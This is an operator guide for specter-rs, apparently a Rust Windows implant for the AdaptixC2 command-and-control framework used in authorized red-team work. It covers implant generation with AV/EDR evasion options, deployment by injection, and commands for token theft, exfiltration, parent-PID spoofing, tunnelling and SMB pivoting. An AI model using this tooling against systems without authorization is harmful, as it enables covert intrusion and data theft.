# User guide — specter-rs in AdaptixC2

This guide is for the **AdaptixC2 operator**: how to install the
`agent_specter_rs` plugin, create a listener, generate an implant and use it
in a session. For the internals (wire protocol, evasion, parity with the
original specter), see [PARITE.md](PARITE.md), [WIRE.md](WIRE.md) and the
[feasibility study](ETUDE-DE-FAISABILITE.md) (French).

> specter-rs is a Windows x64 agent for AdaptixC2 v1.2, a Rust rewrite of
> [Specter](https://github.com/0xC9H/specter). **Authorized use only** (red
> team engagements, security research, adversary emulation on systems you are
> authorized to target).

---

## 1. Prerequisites (teamserver)

On the machine hosting `adaptixserver`:

```bash
./install.sh        # installs the pinned Rust nightly + targets, then runs make test
```

`install.sh` reads the exact pin from `rust-toolchain.toml` (no MinGW/NASM
needed). The build produces `build/beacon.x64.bin` (raw PIC blob).

## 2. Install the agent plugin

```bash
cd src_server/agent_specter_rs && make     # produces agent_specter_rs.so
```

Copy `agent_specter_rs.so` into the AdaptixC2 server's **extenders**
directory (next to the other `agent_*.so`), then **restart the server**. The
server logs a load error at startup if the file is missing.

The plugin Makefile uses the same Go version and `GOEXPERIMENT` as the
`adaptixserver` binary (see its header comment) — the v1.2 ABI is matched
exactly.

## 3. Create a `specter-http` listener

In the AdaptixC2 UI: **Listeners → New → `specter-http`**.

| Field | Purpose | Example |
|---|---|---|
| Bind host / port | C2 listen address | `0.0.0.0:80` |
| Profile | Malleable profile (JSON v2) | `default` (see §7) |
| TLS | HTTP-layer encryption | your choice |

The listener automatically provides the plugin with the **session key** and
the **watermark**: both are injected into the blob at generation time, no
manual configuration.

## 4. Generate a `specter-rs` agent

**Agents → Generate → type `specter-rs`** (the dialog opens):

| Dialog field | Meaning | Example |
|---|---|---|
| Format | Payload format (only one: raw PIC blob) | `Bin (raw PIC blob)` |
| Sleep | Check-in interval (`1h 2m 5s` or seconds) | `30s` |
| Jitter % | Random extra added to sleep (0-100 %) | `10` |
| Set 'killdate' + date/time | Date after which the implant exits silently | optional |
| Debug | Writes `specter.log` next to the implant (diagnostics) | off in prod |
| Sleep mask | Encrypted sleep (image + private heap, ETW/AMSI hooks active) | on |
| Evasion hooks | ETW/AMSI hooks (HWBP + VEH) | on |
| Force ADD RSP retspoof | Return-address spoofing variant (diagnostic) | off |

The dialog drives the same cargo pipeline as `make`: the generated blob is
identical to `build/beacon.x64.bin` with the listener's config injected.

## 5. Deploy the implant

The `Bin` blob is **position-independent** (single `.text` section, no import
table, no CRT): inject it with any method you like (packer, reflective
loading, service, ...) — e.g. the `tools/harness/` RustPacker (ntapc) for a
test. The session shows up in the AdaptixC2 client.

## 6. Command cheat sheet (session menu / console)

| Category | Commands | Examples |
|---|---|---|
| Session | `sleep`, `terminate thread\|process` | `sleep 30s 10` |
| Files | `pwd` `cd` `ls` `cat` `mkdir` `rm` `cp` `mv` | `ls C:\Users`, `cat C:\file.txt` (first 2048 bytes) |
| Transfers | `upload`, `download`, `exfil start\|stop\|cancel <file_id>` | `upload /tmp/f C:\Temp\f` |
| Processes | `ps list`, `ps kill <pid>`, `ps run [-o] [-s] [-i] [-ppid <pid>] <args>` | `ps run -o -ppid 1234 cmd.exe /c whoami` |
| Jobs | `jobs list`, `jobs kill <task_id>` | `jobs list` |
| Misc | `getuid`, `disks`, `screenshot` | `screenshot` |
| Tokens | `tkn steal\|make\|impersonate\|revert\|list\|remove\|getuid\|privs` | `tkn steal 1234` → `tkn impersonate 1` → `tkn revert` |
| Shell | `shell` (interactive cmd/PowerShell terminal) | via the "Remote Shell" menu |
| BOF | `execute bof [-a] <file.o> [params]` | `execute bof /home/user/whoami.o` (`-a` = async) |
| Tunnels | `socks start\|stop`, `lportfwd start\|stop`, `rportfwd start\|stop` | `socks start 127.0.0.1 1080`, then `curl --socks5-hostname 127.0.0.1:1080 ...` |
| SMB pivot | `link <pipe>`, `unlink` | `link \\\\10.0.0.5\\pipe\\specter` |

Notes:
- `download` streams the file into the server's file browser; `upload` chunks
  at 8 KiB; both resume/relay across check-in cycles.
- `execute bof`: BOFs compile with plain `rustc` (`--emit=obj`) or MSVC C —
  see `tools/bof/hello.rs` for the calling convention.
- `link`: while a pivot is active, the whole check-in goes over the named
  pipe (SMB when `\\host\pipe\...`). `unlink` switches back to direct HTTP.

## 7. Malleable profiles (JSON v2)

Profiles in `profiles/*.json` (v2 format, unchanged from specter) are
embedded at build time; **the listener's profile overrides the embedded
one**. Main fields (see `profiles/default.json`): `hosts` (rotation
`sequential`/`random`), `user_agent`, `get.uris`, `post.uris`, client/server
headers, and the response page template `server.output`
(`prepend`/`append` around the encrypted payload).

> The beacon reads the response page into a **256 KiB heap buffer**; the
> plugin **caps the task pack at 192 KiB** and re-queues the overflow to the
> next check-in (order preserved) — big uploads/BOFs no longer truncate the
> page.

## 8. Troubleshooting

| Symptom | Lead |
|---|---|
| No session | listener started? watermark/key injected? firewall? |
| Session dies by itself | killdate reached, or the **watchdog** (30 consecutive check-in failures → silent exit) |
| `ci: fail range` in `specter.log` | truncated page — pack over 192 KiB (fixed in RC1) |
| Debugging | tick **Debug** at generation → `specter.log` next to the implant (bootstrap, check-in, sleep, BOF) |
| Encrypted sleep | `sm: pool ok` / `sm: stubext ok` in the log = threadpool + external stub copy active |

## 9. Reminders

- **Strictly authorized use** (red team engagements, security research,
  adversary emulation). See the BSD-3-Clause license and the README.
- The server side (listeners, UI) stays the original AdaptixC2 in Go;
  specter-rs replaces only the **agent** and its generation plugin.
